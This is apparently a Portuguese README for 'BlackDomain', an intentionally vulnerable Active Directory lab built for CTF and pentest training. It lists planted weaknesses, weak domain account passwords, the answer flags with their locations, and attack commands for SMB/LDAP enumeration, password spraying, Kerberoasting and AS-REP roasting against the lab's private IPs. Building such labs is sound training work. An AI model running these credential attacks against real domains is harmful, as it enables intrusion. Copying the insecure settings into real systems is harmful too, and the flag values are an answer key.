# 🏴‍☠️ BlackDomain - Ambiente Active Directory para CTF

![Status](https://img.shields.io/badge/status-active-success.svg)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue.svg)
![License](https://img.shields.io/badge/license-MIT-blue.svg)
[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-Donate-yellow.svg)](https://www.buymeacoffee.com/dionelima)

> **Criado com ☕ e código por [Dione Lima](https://github.com/dionebr)**

**BlackDomain** é um ambiente artesanal e detalhado de Active Directory, desenhado meticulosamente para ser o playground definitivo de Pentest e CTF.
Este projeto vai além de um simples lab automatizado; é um cenário vivo, cheio de armadilhas, vulnerabilidades reais e desafios que vão testar suas habilidades de Red Team.

## 📋 Índice

- [Características](#-características)
- [Requisitos](#-requisitos)
- [Instalação](#-instalação)
- [Topologia de Rede](#-topologia-de-rede)
- [Credenciais](#-credenciais)
- [Flags](#-flags)
- [Uso](#-uso)
- [Troubleshooting](#-troubleshooting)
- [Contribuindo](#-contribuindo)

## ✨ Características

### Infraestrutura Completa
- **Controlador de Domínio** (Windows Server 2019)
- **2 Workstations** (Windows 10) unidas ao domínio
- **Servidor de Logs** (Ubuntu 22.04 com Wazuh SIEM)
- **Topologia de rede isolada** com 2 subnets

### Vulnerabilidades Implementadas
- ✅ Enumeração de domínio (LDAP/SMB anônimo)
- ✅ Compartilhamentos SMB vulneráveis
- ✅ Password Spraying
- ✅ Kerberoasting
- ✅ AS-REP Roasting
- ✅ SeBackupPrivilege Abuse
- ✅ GPP Passwords (MS14-025)
- ✅ Credenciais em texto claro
- ✅ Lateral Movement habilitado

### Monitoramento
- 📊 Wazuh SIEM completo via Docker
- 📈 Dashboards de segurança
- 🔍 Coleta centralizada de logs
- ⚠️ Alertas de ataques

### Sistema de Flags
- 🚩 **7 flags** no formato `XACK{hash_md5}`
- 🎯 Distribuídas em diferentes níveis de dificuldade
- 🏆 Cobrindo múltiplas técnicas de exploração

## 🧰 Requisitos

### Hardware Mínimo
| Componente | Requisito |
|------------|-----------|
| **RAM** | 8 GB (recomendado: 12 GB) |
| **CPU** | 4 núcleos (recomendado: 6 núcleos) |
| **Disco** | 60 GB livres |
| **Sistema** | Windows 10/11, macOS ou Linux |

### Software Necessário
- [VirtualBox](https://www.virtualbox.org/) 7.0+
- [Vagrant](https://www.vagrantup.com/) 2.4+
- Git (para clonar o repositório)

### Distribuição de Memória
- **DC01** (Domain Controller): 2 GB RAM
- **WS01** (Workstation 1): 2 GB RAM
- **WS02** (Workstation 2): 2 GB RAM
- **LogServer** (Wazuh): 1 GB RAM
- **Total**: 7 GB RAM

## 🚀 Instalação

### 1. Clonar o Repositório

```bash
git clone https://github.com/seu-usuario/BlackDomain.git
cd BlackDomain
```

### 2. Iniciar o Ambiente

```bash
# Provisionar todas as VMs (primeira vez: 30-45 minutos)
vagrant up

# Ou provisionar VMs individualmente
vagrant up dc01      # Controlador de Domínio
vagrant up ws01      # Workstation 1
vagrant up ws02      # Workstation 2
vagrant up logsrv    # Servidor de Logs
```

### 3. Verificar Status

```bash
# Verificar status de todas as VMs
vagrant status

# Verificar se o domínio está funcional
vagrant ssh dc01 -c "Get-ADDomain"
```

### 4. Acessar as Máquinas

```bash
# SSH para Linux
vagrant ssh logsrv

# RDP para Windows (requer configuração adicional)
# Ou use o VirtualBox GUI
```

## 🌐 Topologia de Rede

```
┌─────────────────────────────────────────────────────────┐
│                  BlackDomain Network                     │
└─────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────┐
│  Servers Subnet (10.10.10.0/24)                         │
├──────────────────────────────────────────────────────────┤
│  ┌──────────────────┐      ┌──────────────────┐        │
│  │  DC01            │      │  LogServer       │        │
│  │  10.10.10.10     │      │  10.10.10.20     │        │
│  │  Windows Server  │      │  Ubuntu + Wazuh  │        │
│  │  AD DS + DNS     │      │  SIEM            │        │
│  └──────────────────┘      └──────────────────┘        │
└──────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────┐
│  Workstations Subnet (10.10.20.0/24)                    │
├──────────────────────────────────────────────────────────┤
│  ┌──────────────────┐      ┌──────────────────┐        │
│  │  WS01            │      │  WS02            │        │
│  │  10.10.20.11     │      │  10.10.20.12     │        │
│  │  Windows 10      │      │  Windows 10      │        │
│  │  IIS Server      │      │  SQL Express     │        │
│  └──────────────────┘      └──────────────────┘        │
└──────────────────────────────────────────────────────────┘
```

### Detalhes das Máquinas

| Hostname | IP | OS | Função | Serviços |
|----------|----|----|--------|----------|
| **DC01** | 10.10.10.10 | Windows Server 2019 | Domain Controller | AD DS, DNS, SMB |
| **WS01** | 10.10.20.11 | Windows 10 | Workstation | IIS, WinRM |
| **WS02** | 10.10.20.12 | Windows 10 | Workstation | SQL Express (simulado), WinRM |
| **LogServer** | 10.10.10.20 | Ubuntu 22.04 | SIEM | Wazuh, Docker |

## 🔑 Credenciais

### Domínio: BlackDomain.local

#### Usuários do Active Directory

| Usuário | Senha | Grupo | Descrição |
|---------|-------|-------|-----------|
| `Administrator` | `P@ssw0rd!` | Domain Admins | Administrador do domínio |
| `alice` | `Password123` | Domain Users | Usuária comum |
| `bob` | `Password123` | Domain Users | Usuário comum |
| `backup` | `P@ssw0rd!` | Domain Admins, Backup Operators | Conta de backup (privilegiada) |
| `svc_sql` | `Service123` | Domain Users | Service Account (Kerberoastable) |
| `john` | `Welcome2024` | Domain Users | Usuário vulnerável (AS-REP Roastable) |

#### Servidor de Logs (Wazuh)

- **Dashboard**: https://10.10.10.20
- **Usuário**: `admin`
- **Senha**: Verificar em `/opt/wazuh/docker-compose.yml`

## 🚩 Flags

O BlackDomain contém **7 flags** no formato `XACK{hash_md5}`:

| # | Flag | Localização | Técnica |
|---|------|-------------|---------|
| 1 | `XACK{c4ca4238a0b923820dcc509a6f75849b}` | `\\dc01\Public\flag1.txt` | Enumeração SMB |
| 2 | `XACK{c81e728d9d4c2f636f067f89cc14862c}` | `\\dc01\Backups\secrets.txt` | Backup Operators |
| 3 | `XACK{eccbc87e4b5ce2fe28308fd9f2a7baf3}` | SYSVOL Groups.xml | GPP Password |
| 4 | `XACK{a87ff679a2f3e71d9181a67b7542122c}` | `C:\Users\Public\Documents\passwords.txt` | Credenciais em texto |
| 5 | `XACK{e4da3b7fbbce2345d7772b0674a318d5}` | Histórico PowerShell | Análise forense |
| 6 | `XACK{1679091c5a880faf6fb5e6087eb1b2dc}` | `/opt/wazuh/flags/flag6.txt` | Acesso ao SIEM |
| 7 | `XACK{8f14e45fceea167a5a36dedd4bea2543}` | `/root/flag7.txt` | Escalação de privilégios Linux |

> **Nota**: As flags acima são exemplos. Cada instância pode ter flags diferentes.

## 💻 Uso

### Cenários de Treinamento

#### 1. Reconhecimento Inicial
```bash
# De uma máquina atacante (Kali Linux)
nmap -sV -p- 10.10.10.10
enum4linux -a 10.10.10.10
crackmapexec smb 10.10.10.0/24
```

#### 2. Enumeração de Usuários
```bash
# LDAP anônimo
ldapsearch -x -H ldap://10.10.10.10 -b "DC=BlackDomain,DC=local"

# SMB null session
smbclient -L //10.10.10.10 -N
```

#### 3. Password Spraying
```bash
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123'
```

#### 4. Kerberoasting
```bash
GetUserSPNs.py BLACKDOMAIN/alice:Password123 -dc-ip 10.10.10.10 -request
hashcat -m 13100 hashes.txt wordlist.txt
```

#### 5. AS-REP Roasting
```bash
GetNPUsers.py BLACKDOMAIN/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat
```

### Gerenciamento do Ambiente

```bash
# Pausar todas as VMs
vagrant halt

# Reiniciar uma VM específica
vagrant reload dc01

# Destruir e recriar
vagrant destroy -f
vagrant up

# Tirar snapshot (VirtualBox)
VBoxManage snapshot "BlackDomain-DC01" take "clean_state"
```

## 🔧 Troubleshooting

### Problema: VMs não iniciam

**Solução**:
```bash
# Verificar logs
vagrant up --debug

# Verificar VirtualBox
VBoxManage list vms
VBoxManage list runningvms
```

### Problema: Workstations não ingressam no domínio

**Solução**:
1. Verificar se DC01 está rodando: `vagrant status dc01`
2. Verificar DNS: `vagrant ssh ws01 -c "nslookup blackdomain.local"`
3. Verificar conectividade: `vagrant ssh ws01 -c "ping 10.10.10.10"`

### Problema: Wazuh não inicia

**Solução**:
```bash
vagrant ssh logsrv
cd /opt/wazuh
docker-compose down
docker-compose up -d
docker-compose logs -f
```

### Problema: Memória insuficiente

**Solução**:
Editar `Vagrantfile` e reduzir memória das VMs:
```ruby
vb.memory = 1024  # Reduzir para 1GB
```

## 📚 Recursos Adicionais

### Ferramentas Recomendadas
- [Impacket](https://github.com/SecureAuthCorp/impacket) - Toolkit Python para protocolos Windows
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - Análise de caminhos de ataque AD
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - Post-exploitation tool
- [Rubeus](https://github.com/GhostPack/Rubeus) - Toolkit Kerberos

### Referências
- [MITRE ATT&CK - Active Directory](https://attack.mitre.org/)
- [HackTricks - AD Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [PayloadsAllTheThings - AD Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

## ⚠️ Avisos Importantes

> **ATENÇÃO**: Este ambiente contém vulnerabilidades REAIS e intencionais. 
> 
> - ❌ **NUNCA** use em produção
> - ❌ **NUNCA** conecte à internet
> - ❌ **NUNCA** use com dados reais
> - ✅ **SEMPRE** mantenha isolado
> - ✅ **SEMPRE** use apenas para treinamento

## 🤝 Contribuindo

Contribuições são bem-vindas! Por favor:

1. Fork o projeto
2. Crie uma branch para sua feature (`git checkout -b feature/NovaVulnerabilidade`)
3. Commit suas mudanças (`git commit -m 'Adiciona nova vulnerabilidade'`)
4. Push para a branch (`git push origin feature/NovaVulnerabilidade`)
5. Abra um Pull Request

## 📄 Licença

Este projeto está licenciado sob a MIT License - veja o arquivo [LICENSE](LICENSE) para detalhes.

## 🙏 Agradecimentos

- [christophetd/Adaz](https://github.com/christophetd/Adaz) - Projeto base
- [Orange-Cyberdefense/GOAD](https://github.com/Orange-Cyberdefense/GOAD) - Inspiração
- Comunidade de InfoSec

---

**Desenvolvido com ❤️ para a comunidade de Segurança da Informação**

*BlackDomain - Aprenda Active Directory Security de forma prática e segura*
